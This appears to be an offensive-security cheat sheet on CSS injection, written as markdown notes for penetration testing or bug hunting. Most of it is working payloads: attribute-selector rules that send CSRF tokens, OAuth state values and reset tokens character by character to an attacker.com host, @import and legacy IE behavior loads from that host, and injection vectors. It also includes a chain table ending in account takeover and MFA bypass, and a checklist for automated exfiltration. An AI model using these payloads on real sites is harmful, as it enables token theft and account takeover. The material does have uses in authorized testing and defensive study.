# CSS Injection

> When JS is blocked (CSP), CSS can still exfiltrate tokens via attribute selectors.

## Attack Surface
User-controlled CSS surface: themes, profile pages, signature fields, HTML email renderers, rich-text editors, PDF generators, markdown renderers.

```bash
# Find candidates from recon
cat recon/urls.txt | grep -iE "theme|profile|signature|customize|email|invoice|pdf|render|markdown"
```

## Exfiltration via Attribute Selectors
```css
/* Steal CSRF token character by character */
input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/log?c=a); }
input[name="csrf_token"][value^="b"] { background: url(https://attacker.com/log?c=b); }
/* ... repeat for all chars */

/* Steal OAuth state */
input[name="state"][value^="x"] { background: url(https://attacker.com/log?c=x); }

/* Steal any attribute */
[href^="https://target.com/reset?token="] { background: url(https://attacker.com/log?token=...); }
```

## CSS Injection → XSS (Rare But Possible)
```css
/* If @import allowed */
@import url("https://attacker.com/xss.css");

/* If expression() allowed (IE only, legacy) */
body { xss: expression(alert(1)); }

/* If behaviors allowed (IE) */
body { behavior: url("https://attacker.com/xss.htc"); }
```

## Blind CSS Exfiltration (No JS)
```css
/* Binary search exfil - test one bit at a time */
input[name="secret"][value^="a"] { background: url(https://attacker.com/1); }
input[name="secret"][value^="b"] { background: url(https://attacker.com/2); }
/* ... automate with script to reconstruct full value */
```

## Injection Vectors
```html
<!-- Direct style attribute -->
<div style="background: url('https://attacker.com/log?x=1');">

<!-- Style tag injection -->
<style>input[value^="a"] { background: url(https://attacker.com/log?c=a); }</style>

<!-- @import in user-controlled CSS file -->
@import url("https://attacker.com/steal.css");

<!-- CSS custom properties (variables) -->
:root { --token: "stolen"; }
```

## Detection
```bash
# Test: inject CSS payload that triggers callback
# Payload: } input[value^="a"] { background: url(https://attacker.com/c); } /*
# If callback fires → CSS injection confirmed
```

## Chain Escalation
| Chain | Result |
|-------|--------|
| CSS injection + CSRF token exfil | CSRF bypass on critical action |
| CSS injection + OAuth state/token exfil | ATO via OAuth |
| CSS injection + password reset token | ATO |
| CSS injection + 2FA backup code | MFA bypass |

## Testing Checklist
```
[ ] Find user-controlled CSS injection points
[ ] Test attribute selector exfiltration
[ ] Test @import injection
[ ] Test CSS variable injection
[ ] Identify sensitive attributes to target (csrf_token, state, token, etc.)
[ ] Build automated exfiltration script
[ ] Prove chain: exfil token → use token for unauthorized action
```